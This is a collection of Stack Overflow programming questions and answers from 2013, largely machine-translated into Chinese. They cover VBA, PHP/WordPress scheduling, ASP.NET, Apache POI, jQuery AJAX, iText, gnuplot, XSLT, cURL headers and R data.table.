A1.RankValue 是我需要在存储库中计算的字段，它不是来自数据库，使用 Rank.Value 和 Rank.Hits （而 Rank.Value 显然包含当前排名值）。

我在 A1 配置中试过这个，但这会创建一个从 Rank 到 A1 的 FK，这不是我需要的。

```
 HasRequired(e => e.Rank)
    .WithRequiredPrincipal()
    .WillCascadeOnDelete(true); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:58:37.480

我解决了将 RankId 列添加到 A1 的问题。

# vba - VBA 跳过 For 循环 - 为什么？

> ID：14977948
> 
> 赞同：1
> 
> 时间：2013-02-20T10:48:11.263
> 
> 标签：vba, loops, for-loop

我在 MS Word Visual Basic 编辑器中有这个 VBA 代码；

它旨在重置页码，以便它们连续工作。但是，它似乎跳过了循环的全部内容而不执行它。

```
Sub Macro3()
'
' Macro3 Macro
' Test 3
'
Dim GetNumberOfPages

    For IncVar = 1 To GetNumberOfPages
        WordBasic.ViewFooterOnly
        ActiveDocument.AttachedTemplate.BuildingBlockEntries(" Blank").Insert _
            Where:=Selection.Range, RichText:=True
        WordBasic.ViewFooterOnly
        ActiveDocument.AttachedTemplate.BuildingBlockEntries("Plain Number 3"). _
            Insert Where:=Selection.Range, RichText:=True
        ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
        Selection.WholeStory
        With Selection.Sections(IncVar).Headers(IncVar).PageNumbers
            .NumberStyle = wdPageNumberStyleArabic
            .HeadingLevelForChapter = 0
            .IncludeChapterNumber = False
            .ChapterPageSeparator = wdSeparatorHyphen
            .RestartNumberingAtSection = False
            .StartingNumber = 0
        End With
        Selection.WholeStory
        Selection.EscapeKey
        ActiveWindow.ActivePane.View.ShowAll = Not ActiveWindow.ActivePane.View. _
            ShowAll
        Selection.EscapeKey
        Selection.EscapeKey
    Next IncVar
End Sub 
```

为什么是这样？我该如何解决？

谢谢，

巴里·史密斯

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-20T10:52:40.080

如果您使用`f8`您`Step Into...`的序列并检查您的值，`GetNumberOfPages`您将看到`GetNumberOfPages = Empty`整个循环被跳过

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-20T10:57:41.970

`GetNumberOfPages`是一个变量，默认为空。

您首先需要为其分配一些值，例如

```
Dim numberOfPages as Integer
Dim currentPage as Integer
numberOfPages = ActiveDocument.BuiltInDocumentProperties(wdPropertyPages)
For currentPage = 1 To numberOfPages
    ...
Next currentPage 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:54:45.573

我想你是这样想的

```
Dim GetNumberOfPages as integer = ActiveDocument.BuiltInDocumentProperties(wdPropertyPages) //check the syntax . i'm not sure. 
```

但是忘记初始化`GetNumberOfPages`

# php - 在 PHP 中将每日执行更改为每小时执行

> ID：14977951
> 
> 赞同：0
> 
> 时间：2013-02-20T10:48:22.017
> 
> 标签：php, wordpress, scheduler

我之前问过这个问题，但问的方式不清楚，所以我再试一次。

我试图让这个 PHP 每小时而不是每天执行一次。这是一个导入 RSS 提要的 wordpress 插件。是 GPL。我只有便宜的主机，所以我无法访问服务器上的命令行/ cron。

我在这里搜索并找到了这篇文章：[PHP Running an hourly script](https://stackoverflow.com/questions/3557834/php-running-an-hourly-script)但它并没有帮助我理解。我不知道 PHP，我尝试过编辑、破坏、谷歌搜索、再次破坏等

如果有人可以编辑它以使其正常工作，我将永远感激不尽。

这是每天执行的原始工作代码：http: [//pastebin.ca/2313994](http://pastebin.ca/2313994)

我正在查看我们定义发布日的这一点：

```
define('SCRD_DEFAULT_POST_DAYS', 'a:7:{s:6:"Monday";i:0;s:7:"Tuesday";i:0;s:9:"Wednesday";i:0;s:8:"Thursday";i:0;s:6:"Friday";i:1;s:8:"Saturday";i:0;s:6:"Sunday";i:0;}'); 
```

我在想，如果我 24 小时都知道 PHP，我可以输入所有 24 个值，它会欺骗脚本每小时运行一次吗？

定义所有 24 小时的代码是什么？

```
s:6:"12:00";?:?;?:?:"13:00";?:?;?:?:"14:00";?:?;?:?: etc 
```

或者这种方法行不通？

我用谷歌搜索：define('SCRD_DEFAULT_POST_DAYS'，但只找到这篇文章和原始代码。

我已经尝试过编辑这部分：define('SCRD_DEFAULT_HOUR', '17'); 读书

定义（'SCRD_DEFAULT_HOUR', '17' '18' '19' '20' 等，但它对我不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T13:58:37.450

插件作者在这里。

你找错地方了。要解决这个问题，您需要操纵安排下一个摘要的函数，特别是`function scrd_do_digest`从第 65 行开始的函数。

我没有对此进行测试，但我将从替换第 67 行的代码开始：

```
$next_digest = $right_now + 3600;   // schedule for one hour from now 
```

现在这是一个彻底的黑客攻击，所以如果你这样做，显示下一个摘要时间的其他地方将会对你撒谎。此外，每当您更新设置时，将根据您在 UI 中设置的时间表设置下一次发布摘要。您也许可以使用“立即发布”按钮让球早日滚动。

# c# - How to save value in session in .net

> ID：14977956
> 
> 赞同：0
> 
> 时间：2013-02-20T10:48:56.283
> 
> 标签：c#, web-services

I am trying to save value in session in webservice but it gives me error: `object reference not set to an instance of an object`.

```
Session["ProcessStartTime"] = strDate; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:54:53.110

1.  确保你`strDate`不为空
2.  `Session["ProcessStartTime"] = strDate;`检查您使用之前声明方法启用了会话

这是一个样本

```
public class mytest: System.Web.Services.WebService
    {
        [WebMethod (EnableSession = true)]
        public string HelloWorld()
        {
           //your logic here
            if(strDate!=null)
                  Session["ProcessStartTime"] = strDate;
            else
                 // handle if ur strDate is null
         }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:06:15.317

添加`(EnableSession = True)`到 WebMethod

```
[WebMethod (EnableSession = true)] 
```

或阅读这篇关于[如何在 Web 服务中使用会话状态的好文章](http://www.codeproject.com/Articles/35119/Using-Session-State-in-a-Web-Service)

# wordpress - 如何将 Wordpress 中的子页面链接到父页面？

> ID：14977957
> 
> 赞同：0
> 
> 时间：2013-02-20T10:49:03.763
> 
> 标签：wordpress

奇怪的问题，也许我的逻辑在这个问题上是错误的，但我在 Wordpress 中有这样的结构：

*   第 1 页

    *   第 1 页的子页面
    *   第 1 页的子页面
*   第2页

    *   第 2 页的子页面
    *   第 2 页的子页面
    *   第 2 页的子页面

在我的主题中，我将其输出为每个父母一页。

例如：

布局是

```
<h1>title of page 1</h1>
<p>content of page 1</p> 
```

之后是几个小块：

```
<div class="box first child-page">
box with content of child page of page 1
</div>
<div class="box second child-page">
box with content of child page of page 1
</div>
<div class="box last child-page">
box with content of child page of page 1
</div> 
```

但; 现在我的问题！当有人使用搜索框时，还会显示带有唯一永久链接的子页面，这是正确的，但我需要它们链接到父页面。子页面不应作为唯一页面访问，但内容必须是可搜索的（因为该内容确实存在于网页上）。希望你们明白我要说的。我尝试将子页面 301 重定向到父页面，但我需要一些更简单的东西让我的客户能够创建子页面，而不必担心 301 重定向。

问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:30:45.270

要获取父 url，您可以在子页面的循环中执行此操作

```
<?php
     $parent = get_permalink($your_child_loop_variable->post_parent);
?> 
```

# java - Eclipse shows error for MissingCellPolicy

> ID：14977958
> 
> 赞同：0
> 
> 时间：2013-02-20T10:49:05.287
> 
> 标签：java, apache-poi

I am using Apache POI to read data from Excel files. I have some blank/null cells in my Excel which I want to handle using `MissingCellPolicy.RETURN_NULL_AND_BLANK`. However, Eclipse underlines `RETURN_NULL_AND_BLANK` when I hover the mouse over it and I get a pop-up saying *RETURN_NULL_AND_BLANK cannot be resolved or is not a field*

I have imported the Row.MissingCellPolicy class. Can anyone point out what needs to be done?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T11:03:25.420

[MissingCellPolicy](http://grepcode.com/file/repo1.maven.org/maven2/org.apache.poi/poi/3.9/org/apache/poi/ss/usermodel/Row.java#Row.MissingCellPolicy)是[Row](http://grepcode.com/file/repo1.maven.org/maven2/org.apache.poi/poi/3.9/org/apache/poi/ss/usermodel/Row.java#Row)接口的静态嵌套类。而RETURN_NULL_AND_BLANK是ROW接口的静态字段。

所以你应该访问：

```
Row.RETURN_NULL_AND_BLANK; 
```

或者改用[静态导入](http://docs.oracle.com/javase/1.5.0/docs/guide/language/static-import.html)：

```
import static org.apache.poi.ss.usermodel.Row.MissingCellPolicy;
import static org.apache.poi.ss.usermodel.Row.RETURN_NULL_AND_BLANK;

//....
MissingCellPolicy policy = RETURN_NULL_AND_BLANK; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-22T00:26:06.833

添加 Row.RETURN_NULL_AND_BLANK; 帮助我而不是添加 Row.MissingCellPolicy.RETURN_NULL_AND_BLANK; 或 MissingCellPolicy.RETURN_NULL_AND_BLANK；并且 Eclipse 不会抛出错误。

这是因为我的工作表是 XSSFSheet，它只返回一个 XSSFRow 行，而 XSSFRow（或者甚至是 HSSFRow）直接从 Row 类继承这些常量。[在此处查看更多信息](https://poi.apache.org/apidocs/org/apache/poi/xssf/usermodel/XSSFRow.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-03T20:44:50.313

```
Row is interface 
MissingCellPolicy is the enum in Row
and
1\. RETURN_NULL_AND_BLANK
2\. RETURN_BLANK_AS_NULL
3\. CREATE_NULL_AS_BLANK 
```

是要访问 1 到 3 中的任何一个的静态字段

利用

```
Row.MissingCellPolicy.RETURN_NULL_AND_BLANK 
```

或根据要求使用其他两个

# javascript - 使用 twitter bootstrap 时如何使用 jquery 获取表单对象

> ID：14977963
> 
> 赞同：2
> 
> 时间：2013-02-20T10:49:26.210
> 
> 标签：javascript, jquery, twitter-bootstrap

我有一个来自 twitter bootstrap 的模型对象，如下所示

```
 <!-- Name Edit div -->
<div id="form-content" class="modal hide fade in" tabindex="-1">
  <form name="form" action="<c:url value="/editname" />" method="post">
    <div class="modal-header">
      <h4>Edit Name</h4>
    </div>
    <div class="modal-body">
     <div class="control-group">
        <div class="controls">
          <ul class="nav nav-list">
            <li class="nav-header">First Name</li>
            <li><input type="text" placeholder="First Name" name="firstName" id="firstName" class="input-xlarge help-inline"></li>
            <li class="nav-header">Last Name</li>
            <li><input type="text" placeholder="Last Name" name="lastName" id="lastName" class="input-xlarge help-inline"></li>
         </ul>
        </div>
      </div>
    </div>
    <div class="modal-footer">
       <button id="submit"  class="btn btn-success">Update</button>
       <button class="btn" data-dismiss="modal" >Close</button>
    </div>
  </form>
</div> 
```

我的ajax脚本如下：

```
$(function() {
    //twitter bootstrap script
    $("button#submit").click(function(){
        var $form = $(this).closest("form").attr('id');
        $.ajax({
            type: $form.attr('method'),
            url: $form.attr('action'),
            data: $form.serialize(),
            success: function(msg){
                $("#thanks").html(msg);
                $("#form-content").modal('hide');
            },
            error: function(){
                //alert("failure");
            }
        });
    });
}); 
```

但是请求没有触发。我签入了萤火虫，看起来它无法获取表单对象并且请求不会发送到控制器。我怎样才能让它工作。将来我将在同一页面中有多个表单。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T11:09:39.923

我建议您使用以下`.submit()`功能：

```
$(function() {
    $('#form_id').submit(function(e) {
        e.preventDefault();
        var form = $(this);
        $.ajax({
          type: form.attr('method'),
          url: form.attr('action'),
          data: form.serialize(),
          success: function(msg){
            $("#thanks").html(msg);
            $("#form-content").modal('hide');    
          },
          error: function(){
            //alert("failure");
          }
        });
    });
}); 
```

将表单 id 设置为某物并更改 javascript 以匹配

您还可以将 a 添加`data-ajax="true"`到要提交 bia ajax 的所有表单中，然后使用：

```
var forms = $('form[data-ajax="true"]');
forms.submit(function(e){
    e.preventDefault();
    // do ajax
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-20T11:01:33.210

```
<form name="form" action="<c:url value="/editname" />" method="post"> 
```

一件事是您没有为表单提供 id。

var $form = $(this).closest("form").attr('id');

如果 id 存在（如果你通过代码添加它），那么上面`$form`将包含表单的 id。那是一个字符串。

所以像这样使用，

```
var $form = $(this).closest("form"); 
```

反而

```
var $form = $(this).closest("form").attr('id'); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-20T12:14:29.173

所有 HTML 表单输入控件（输入、选择、按钮等）都有对其所有者的引用。这使得可以做到：

```
var $form = $(this.form); 
```

但我认为 oleron 使用`submit`事件的答案是正确的方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T11:03:29.797

您的表单没有 id 属性。给它一个，它可能会起作用。所以

```
 var $form = $(this).closest("form").attr('id'); 
```

不会返回值。

# java - 如何使用itext在pdf中添加多个页眉和页脚

> ID：14977967
> 
> 赞同：1
> 
> 时间：2013-02-20T10:49:32.060
> 
> 标签：java, itext

在我的 pdf 中，我需要有多个页眉和页脚。在页眉中，我希望标题在左侧，一些文本在中间。

同样在页脚中，我需要在左侧打印我的公司名称，在中间打印页码，并在右侧打印有关我表格中内容的一些信息。

我看过很多帖子，但我没有得到创建这个的正确想法。有人请帮我一些示例代码片段。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T13:59:09.290

应使用“页面事件”添加页眉和页脚。如果您需要一些示例，只需在官方网站上查找关键字[页眉](https://developers.itextpdf.com/tags/header)/[页脚即可。](https://developers.itextpdf.com/tags/footer)

只需创建一个扩展`PdfPageEventHelper`并实现该`onEndPage()`方法的类。阅读文档的人不会犯使用该`onStartPage()`方法的常见错误，但也许您忽略了这一点，因此我将其添加为额外的警告。

使用该方法将您的类的实例添加到 PdfWriter 对象`setPageEvent()`。

我不知道我是否理解您所说的“多个”标题是什么意思。如果您有多个页面事件实现，您可以使用该`setPageEvent()`方法将它们全部添加，它们都会被执行。如果要从一个页面事件实现切换到另一个，则需要先使用`setPageEvent(null)`。

也许您希望不同页面的标题不同，只需在页面事件实现中使用成员变量并在此过程中更改它。[在名为MovieHistory2](https://developers.itextpdf.com/examples/itext-action-second-edition/chapter-5#228-moviehistory2.java)的书中示例之一中，标题的文本存储在`String`名为 的数组中`header`。

页眉的位置取决于页码：

```
 public void onEndPage(PdfWriter writer, Document document) {
        Rectangle rect = writer.getBoxSize("art");
        switch(writer.getPageNumber() % 2) {
        case 0:
            ColumnText.showTextAligned(writer.getDirectContent(),
                    Element.ALIGN_RIGHT, header[0],
                    rect.getRight(), rect.getTop(), 0);
            break;
        case 1:
            ColumnText.showTextAligned(writer.getDirectContent(),
                    Element.ALIGN_LEFT, header[1],
                    rect.getLeft(), rect.getTop(), 0);
            break;
        }
        ColumnText.showTextAligned(writer.getDirectContent(),
                Element.ALIGN_CENTER, new Phrase(String.format("page %d", pagenumber)),
                (rect.getLeft() + rect.getRight()) / 2, rect.getBottom() - 18, 0);
    } 
```

对于偶数页码，页眉添加到右侧；对于左侧的奇数页码。如您所见，页脚居中。

您还提到了一个标题表。如果您想使用表格，请查看[MovieCountries1](https://developers.itextpdf.com/examples/itext-action-second-edition/chapter-5#225-moviecountries1.java)示例。

你说：“我看过这么多帖子，但我没有找到创建这个的正确想法。” 通过阅读文档，您将获得正确的想法，更具体地说是“iText in Action — Second Edition”一书的第 5 章，我所指的代码片段取自其中。

# gnuplot - 在 gnuplot 的 plot 命令中进行计算

> ID：14977969
> 
> 赞同：10
> 
> 时间：2013-02-20T10:49:37.237
> 
> 标签：gnuplot

以下 gnuplot 代码运行良好：

```
plot 'data.txt'  using 2:4  '   %lf %lf %lf %lf' title "1 PE" with linespoints; 
```

在下面的代码中，我想说：“使用第 4 列中的数字，然后将其除以第 3 列中的数字”。或者：“使用第 2 列中的数字，但除以常数 2.0”。以下代码演示了我尝试实现的目标，但它不起作用。

```
plot 'data.txt'  using 2:4/4  '   %lf %lf %lf %lf' title "1 PE" with linespoints;
plot 'data.txt'  using 2:4/2.0  '   %lf %lf %lf %lf' title "1 PE" with linespoints; 
```

这样的事情可能吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-02-20T13:48:47.227

我通常不使用像这样格式化的数据文件，但我认为你正在寻找类似的东西：

```
#divide column 4 by column 3
plot 'data.txt'  using 2:($4/$3)  '   %lf %lf %lf %lf' title "1 PE" with linespoints

#divide column 4 by constant 10.0
plot 'data.txt'  using 2:($4/10.0)  '   %lf %lf %lf %lf' title "1 PE" with linespoints 
```

作为旁注，我认为没有任何理由将格式部分传递给在此处使用。Gnuplot 在空白处拆分数据文件就好了：

```
plot 'data.txt'  using 2:($4/$3) title "1 PE" with linespoints 
```

应该工作得很好。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2018-10-19T05:48:57.030

只是为了添加到给定的答案，如果您更喜欢使用列名（当您的数据有标题时），那么可以使用以下语法：

```
plot 'data.dat' using 'header1':(column('header2')*column('header3')) with lines 
```

## 编辑

我的回答收到了一些反对票，但我不知道为什么。虽然我可以很容易地找到如何使用数字列引用进行计算，但在文档或 SO 中几乎不可能找到使用命名列的技巧，所以我仍然希望我的回答可以帮助其他人。

# c# - 如何使用列名从数据表中获取数据

> ID：14977973
> 
> 赞同：0
> 
> 时间：2013-02-20T10:49:41.370
> 
> 标签：c#, excel

我有一种情况，我用 excel 文件加载数据集。所有工作表都加载为数据表，并以适当的工作表名称作为数据表名称。我想要做的是使用列名获取这个数据表值。但我没有得到错误说

“列‘执行’不属于表 Sheet1”。

在将 excel 加载到数据表时，我使用了 HDR=YES 和 IMEX=1。我也尝试过使用 HDR=NO。没有任何工作。

下面的代码是将excel写入数据表

```
foreach (Microsoft.Office.Interop.Excel.Worksheet wsheet in workbook.Worksheets)
{

    string sql1 = "SELECT * FROM [" + wsheet.Name + "$]";
    OleDbCommand selectCMD1 = new OleDbCommand(sql1, SQLConn);
    SQLAdapter.SelectCommand = selectCMD1;

    SQLAdapter.Fill(dataset.Tables.Add(wsheet.Name));

 } 
```

excel 中的数据完美地加载到每张纸上。但是按列名获取它是问题所在。

请有任何建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:02:21.397

尝试枚举（在调试模式和/或控制台中）`wsheet.Name.Columns`并提取表的列名 - 确保它包含您期望的列名（以及您期望的格式）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T17:06:23.063

对于它的价值，这是我使用的代码，效果很好。我假设您正在使用 Interop 循环浏览工作表，以确保按顺序排列它们。

```
string connectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + filename +
    "; Extended Properties=\"Excel 12.0 XML;HDR=YES\"";
DataSet dsValues = new DataSet();

using (OleDbConnection conn = new OleDbConnection(connectionString))
{
    conn.Open();

    using (OleDbCommand cmd = conn.CreateCommand())
    {
        using (OleDbDataAdapter adapter = new OleDbDataAdapter())
        {
            foreach (Excel.Worksheet wsheet in workbook.Worksheets)
            {
                cmd.CommandText = "SELECT * FROM [" + wsheet.Name + "$]";
                adapter.SelectCommand = cmd;
                adapter.Fill(dsValues.Tables.Add(wsheet.Name));
            }
        }
    }
} 
```

如果在`OleDbDataAdapter`每列的顶部单元格中找不到文本，则它将恢复为缺少标题名称的`F1`, `F2`, ... 表示法。`F3`因此，例如，如果我的 Excel 工作表如下所示：

```
Header1           Header3
Value1   Value3   Value5
Value2   Value4   Value6 
```

然后在`DataTable`I will get columns called `Header1`, `F2`, `Header3`.

您还需要确保您指定为标题行的行在其上方的任何行中都没有文本，否则您将获得一堆`Fn`-type 标题，然后是其他意外文本作为标题名称。例如：

```
 This is my table
Header1  Header2  Header3
Value1   Value3   Value5
Value2   Value4   Value6 
```

最终会出现在 DataTable 中，标题为`This is my table`, `F2`,`F3`等。

# c# - how to hide Gridview row values in asp.net

> ID：14977977
> 
> 赞同：3
> 
> 时间：2013-02-20T10:49:55.333
> 
> 标签：c#, asp.net, .net, vb.net

I have Gridview control with 21 rows.Some of the rows have 0 values.My requirement is to set background color(consist 0 values Rows) as well as hide the values(means 0's).I can able to set background color.But the thing is,I am not able to hide row values.I have written this line of code, gridSellIn.Rows[0].Visible = false; .Total row is hiding.Make sure i have to show rows back ground color without values.Is this possible in asp.net.![enter image description here](../Images/012f030be5408e6cee89f52e3e648b85.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T11:17:26.413

在网格 RowDataBound 事件中：

```
protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (...){
            //hide controls
            foreach (Control c in e.Row.Controls)
            {
                 c.Visible=false;
            }
            //change color
            e.Row.Style.Add("background-color","red");
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:56:34.263

在 GridView1_RowDataBound 事件中，对不需要值的行执行以下操作。

```
 for (int i = 0; i < e.Row.Cells.Count; i++)
        {
             e.Row.Cells[i].Text = "";
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T20:59:27.633

您可以这样做是 DataBinding 事件。

```
protected void GRIDVIEW_DataBinding(object sender, EventArgs e)
{
   foreach(GridViewRow grv in GRIDVIEW.Rows)
   {
     grv.Visible = (Condition_to_check_if_value_loaded_is_zero);
   }
} 
```

# xslt - 在输入中显示值 - xslt

> ID：14977985
> 
> 赞同：0
> 
> 时间：2013-02-20T10:50:10.343
> 
> 标签：xslt

xml

```
<PARAMETER id='threshold' Value='1000' /> 
```

如何在输入中显示上述PARAMETER（阈值）的值？

Xslt

```
 <xsl:when test="@id = 'threshold'">
<td>
<input type="text" id="txtthreshold" value=’@Value‘&gt;
</input>
</td>
</xsl:when> 
```

此外，我希望允许用户更改输入的值并将其带回应用程序（windows.vbnet）。非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T11:21:24.400

为了在定义为 attr_name="xpath_expression" 的属性中显示 XPath 表达式的值，XPath 表达式必须用大括号 ({, }) 括起来。

在你的情况下，

```
<input type="text" id="txtthreshold" value="{@Value}"></input> 
```

另一种方法是使用 <xsl:attribute> XSLT 元素：

```
<input type="text" id="txtthresold">
    <xsl:attribute name="value">
        <xsl:value-of select="@Value" />
    </xsl:attribute>
</input> 
```

# c# - How do I get the full request details from WebException? (GET|POST etc)

> ID：14977987
> 
> 赞同：1
> 
> 时间：2013-02-20T10:50:17.130
> 
> 标签：c#, asp.net-mvc, wcf, asp.net-web-api, system.net.webexception

I have an asp.net web api project. In my controllers I have set up the

```
ExceptionFilterAttribute 
```

To catch any errors at a global level. There are two get requests being fired off from the controller method. They are failing and so I am seeing the exception being raised in the exception filter. However the exception is not showing me details of the failed request. Is it possible to get them? For example 4 GET requests might have been invoked and one of them is failing and the exception is being thrown. But all im seeing is a message saying...

> The remote name could not be resolved: 'xx.xx.com'

But I need more details, like the query string etc...

The response object on the web exception is null too :-(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:00:23.797

在您的`OnException`方法中，您`ExceptionFilterAttribute`有一个 type 的参数参数`HttpActionExecutedContext`。在此类的实例中，您可以访问`Request`和`Response`属性以获取您需要的所有信息，无论是请求还是响应。在该`ActionContext`属性中，您甚至可以获取所有路由、控制器和操作信息。

```
var requestHttpMethod = actionExecutedContext.Request.Method;
var requestUri = actionExecutedContext.Request.RequestUri;

var controllerDescriptor = actionExecutedContext.ActionContext.ControllerContext.ControllerDescriptor;
var actionDescriptor = actionExecutedContext.ActionContext.ActionDescriptor; 
```

您还可以修改响应对象以返回更合适的错误消息。看看这些类可以为您提供哪些信息。

# php - Calling a js script from php doesn't work

> ID：14977989
> 
> 赞同：0
> 
> 时间：2013-02-20T10:50:28.877
> 
> 标签：php, javascript

I'm trying to 'call' a function stored in my .js file from a .php page using this :

```
echo "<script>myFunction(arg1, arg2)</script>"; 
```

and it just doesn't go though. But it works when I use html instead :

```
<script>myFunction(arg1, arg2)</script> 
```

I'll probably feel stupid when you'll provide me with the answer but I just don't get it. Thanks!

EDIT: sorry, more details. The function pops an alert dialog, and I'm calling it **when the page just got loaded**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:57:21.770

了解您所做的是指示 Web 服务器将该行 JavaScript 输出到网页。这将简单地发送给用户，如上所示。一旦用户的浏览器看到该行，它将在客户端（即：在用户的浏览器中）执行 JavaScript。JavaScript 不会也不能在服务器上执行（以防您暗示）。

要检查的一件事是您是否在实际函数声明*之前*调用该函数（在这种情况下它不起作用）。浏览到该网页并检查 HTML 源代码以查看该函数在页面上的显示位置。如果它在函数声明之前，则需要将它放在之后。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:59:56.287

您的函数应该在 .js 文件中

```
//dummy.js
function myFunciton(arg1, arg2)
{
   alert (arg1 + arg2);
} 
```

在您的 PHP 页面中

```
//dummy.php
<script src='dummy.js'></script>
<?php
    echo "<script>myFunction('arg1', 'arg2')</script>";
?> 
```

请注意，您的函数应在调用之前进行初始化。而且，如果您将字符串传递给函数，请将它们括在引号中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T11:04:48.830

确保您的 js 函数在之前声明或将调用包装到 document.ready 中。然后你的代码就可以工作了。

# plone - How do I commit changes to Plone package hosted on github?

> ID：14977991
> 
> 赞同：0
> 
> 时间：2013-02-20T10:50:35.447
> 
> 标签：plone

I want to commit to a Plone package. Do I include it with mr.developer? If yes, the code is in buildout-folder/src. After I made my changes, how do I commit with my existing github account? Should I use something different than mr.developer?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:52:15.760

如果您的 github 帐户中有包的 fork，那么 using`mr.developer`是进行本地更改的绝佳方式。

只需使用普通的 git 工具。存储库确实位于`src/`目录中，只需 cd 到它并使用正常的 git 工作流。然后使用 GitHub 向原始包发出拉取请求以进行更改。

所做的一切`mr.developer`都是为了更轻松地切换构建以使用存储在其中的开发鸡蛋`src/`，并使使用 1 个或多个用于开发鸡蛋的存储库的工作流程。它不需要您对版本控制受管软件包执行任何特殊操作。

# php - Can't Set "Host:" Header with CURL Request

> ID：14977993
> 
> 赞同：3
> 
> 时间：2013-02-20T10:50:50.200
> 
> 标签：php, authentication, curl, header

I am trying to make a CURL request with some basic authentication (through sending an encrypted header). However, when I try to set the `"Host: _"` header, the remote server responds with:

> Bad Request: Your browser sent a request that this server could not understand.

Here's the code that makes the CURL call. Note that it works as soon as I comment out the `"Host: url"` header in the `$http_header` variable. However, it is used on the target server as part of the authentication procedure, so I can not simply remove it.

```
 $curl = curl_init();

    $opt = array(
        CURLOPT_URL=>$url,
        CURLOPT_RETURNTRANSFER=>1,
        CURLOPT_HTTPHEADER=>$http_header,
        CURLOPT_POST=>1,
        CURLOPT_POSTFIELDS=>$data_params,
        CURLOPT_CONNECTTIMEOUT=>5, // Timeout to 5 seconds
    );
    curl_setopt_array($curl, $opt);

    // $output contains the output string
    $output = curl_exec($curl);

    // it closes the session
    curl_close($curl); 
```

The contents of `$http_header` (an associative array):

```
array
  0 => string 'Host: http://localhost/work/myproject'
  1 => string 'Content-Type: multipart/form-data'
  2 => string 'X-Authorization: Basicauth Z2xZjA2YzJhMzIxYTI1ZmIzZTgxYQ==' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T11:57:24.127

标`Host`头不接受完整的 URL，而只接受主机名。

在这种情况下，解决方案是替换此标头：

```
"Host: $url" 
```

和：

```
"Host: ". parse_url($url, PHP_URL_HOST) ." 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:55:06.937

标`Host`头采用主机名，而不是 URL。即`localhost`，不是`http://localhost/work/myproject`。

cURL 应该会自动生成它`CURLOPT_URL`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:55:04.877

标`Host`头不应包含协议，仅包含主机名。因此，在这种情况下，您只需要`localhost`：

```
'Host: localhost' 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-08-08T15:50:17.633

我认为这两个答案都不能回答提问者的问题。我遇到了同样的问题。通过查看 cURL 发送的内容，它正在发送自己的 Host 标头。这意味着当您添加一个时，您现在有两个。当所有服务器看到多个主机头时，它们必须以 400 错误响应。

诀窍是让 cURL 不生成它自己的标题（我还没有弄清楚如何去做）或者不发送你的。在你的情况下，似乎不发送你的很好。但是，对于我正在做的事情，我必须发送我的。

# r - split data.table

> ID：14977997
> 
> 赞同：11
> 
> 时间：2013-02-20T10:50:54.010
> 
> 标签：r, data.table

I have a data.table which I want to split into two. I do this as follows:

```
dt <- data.table(a=c(1,2,3,3),b=c(1,1,2,2))
sdt <- split(dt,dt$b==2) 
```

but if I want to to something like this as a next step

```
sdt[[1]][,c:=.N,by=a] 
```

I get the following warning message.

> Warning message: In `[.data.table`(sdt[[1]], , `:=`(c, .N), by = a) : Invalid .internal.selfref detected and fixed by taking a copy of the whole table, so that := can add this new column by reference. At an earlier point, this data.table has been copied by R. Avoid key<-, names<- and attr<- which in R currently (and oddly) may copy the whole data.table. Use set* syntax instead to avoid copying: setkey(), setnames() and setattr(). Also, list(DT1,DT2) will copy the entire DT1 and DT2 (R's list() copies named objects), use reflist() instead if needed (to be implemented). If this message doesn't help, please report to datatable-help so the root cause can be fixed.

Just wondering if there is a better way of splitting the table so that it would be more efficient (and would not get this message)?

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-20T11:25:09.003

这适用于 v1.8.7（也可能适用于 v1.8.6）：

```
> sdt = lapply(split(1:nrow(dt), dt$b==2), function(x)dt[x])
> sdt
$`FALSE`
   a b
1: 1 1
2: 2 1

$`TRUE`
   a b
1: 3 2
2: 3 2

> sdt[[1]][,c:=.N,by=a]     # now no warning
> sdt
$`FALSE`
   a b c
1: 1 1 1
2: 2 1 1

$`TRUE`
   a b
1: 3 2
2: 3 2 
```

但是，正如@mnel 所说，这是低效的。如果可能，请避免拆分。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-07-06T12:52:12.837

我正在寻找某种方法来拆分 data.table，我遇到了这个老问题。

